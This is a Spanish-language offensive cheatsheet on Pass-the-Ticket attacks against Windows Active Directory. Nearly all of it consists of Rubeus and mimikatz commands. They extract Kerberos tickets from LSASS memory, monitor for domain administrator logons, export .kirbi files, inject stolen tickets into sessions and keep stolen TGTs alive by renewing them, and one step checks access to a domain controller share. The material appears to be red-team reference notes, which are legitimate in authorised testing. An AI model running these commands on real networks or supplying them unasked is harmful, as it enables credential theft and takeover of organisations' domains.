---
aliases:
  - PtT Windows
  - Rubeus dump tickets
  - mimikatz tickets
tags:
  - type/cheatsheet
  - technique/credential-access
  - env/windows
  - asset/active-directory
  - cred/kerberos
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Pass-the-Ticket]]'
---
# Pass-the-Ticket - Windows Extraction

***

## Rubeus dump (one-shot)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Rubeus.exe dump /nowrap` | Todos los TGT/TGS en memoria (base64) | Priv — dump completo. |
| `Rubeus.exe dump /service:krbtgt /nowrap` | Solo TGTs (service = krbtgt) | TGT-focused. |
| `Rubeus.exe dump /user:administrator /nowrap` | Tickets de usuario específico | Targeted. |
| `Rubeus.exe dump /luid:0x3e4 /nowrap` | Tickets de LUID específico | Sesión específica. |
| `Rubeus.exe triage` | Lista tickets sin extraer (con LUIDs) | Pre-dump recon. |
^ptt-win-dump

```powershell
# Step 1: identificar sesiones interesantes
.\Rubeus.exe triage

# Step 2: dump TGT de sesión específica
.\Rubeus.exe dump /luid:0x462d4 /service:krbtgt /nowrap

# Inyectar directo
.\Rubeus.exe dump /service:krbtgt /nowrap | Out-String
# → copiar base64 → Rubeus.exe ptt /ticket:<base64>
```

Requiere `SeDebugPrivilege` (admin local) para leer tickets de otras sesiones.

___

## Rubeus monitor (captura continua)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Rubeus.exe monitor /interval:5` | Nuevos tickets cada 5 seg (base64) | Esperar logon de DA. |
| `Rubeus.exe monitor /interval:5 /filteruser:Admin` | Solo tickets del usuario especificado | Targeted wait. |
| `Rubeus.exe monitor /interval:5 /nowrap` | Sin wrap — base64 directo usable | Pipeline. |
| `Rubeus.exe monitor /interval:5 /runfor:120` | Monitor por 120 segundos | Bounded. |
^ptt-win-monitor

```powershell
# Esperar DA que loguee a este server
.\Rubeus.exe monitor /interval:5 /filteruser:DomainAdmin /nowrap

# Cuando aparece el ticket → inject inmediato
.\Rubeus.exe ptt /ticket:<base64 del output anterior>
dir \\dc01\c$  # Verificar acceso
```

___

## Rubeus harvest (TGT renewal)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Rubeus.exe harvest /interval:30` | Captura TGTs + los renueva automáticamente | Mantener acceso persistente con TGT de user. |
^ptt-win-harvest

```powershell
# Keep-alive con TGT robado
.\Rubeus.exe harvest /interval:30
# Output: new/renewed TGT cada 30 seg hasta expirar
```

___

## mimikatz sekurlsa::tickets (listar)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `mimikatz # privilege::debug` | SeDebugPrivilege | Pre-everything. |
| `mimikatz # sekurlsa::tickets` | Lista todos los tickets en LSASS | Recon — qué hay en memoria. |
| `mimikatz # kerberos::list` | Lista tickets de sesión actual | Sin priv extendido. |
^ptt-win-mimi-list

```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets
```

___

## mimikatz sekurlsa::tickets /export

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `mimikatz # sekurlsa::tickets /export` | .kirbi files en CWD (uno por ticket) | Export para transfer/inject posterior. |
| `mimikatz # kerberos::ptt ticket.kirbi` | Inyectar .kirbi guardado | Post-export inject. |
^ptt-win-mimi-export

```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
:: → genera archivos como [0;3e7]-0-0-40e10000-admin@krbtgt-CORP.LOCAL.kirbi

mimikatz # kerberos::ptt [0;3e7]-0-0-40e10000-admin@krbtgt-CORP.LOCAL.kirbi
klist
```

___

## LUID targeting

| **Concepto** | **Detalle** | **Cuándo** |
|:---:|:---:|:---:|
| LUID (Locally Unique Identifier) | Identifica sesión de logon | Cada sesión tiene su LUID. |
| `Rubeus.exe triage` | Lista LUIDs activos | Pre-dump para elegir target. |
| `whoami /logonid` | LUID de sesión actual | Self-reference. |
| `Rubeus.exe dump /luid:<ID>` | Dump sesión específica | Targeted. |
| `Rubeus.exe ptt /ticket:T /luid:<ID>` | Inject en sesión específica | Cross-session inject (priv). |
^ptt-win-luid

```powershell
# 1. Listar sesiones con LUID
.\Rubeus.exe triage

# 2. Dump TGT de sesión específica (ej: LUID 0x462d4)
.\Rubeus.exe dump /luid:0x462d4 /service:krbtgt /nowrap
```

***
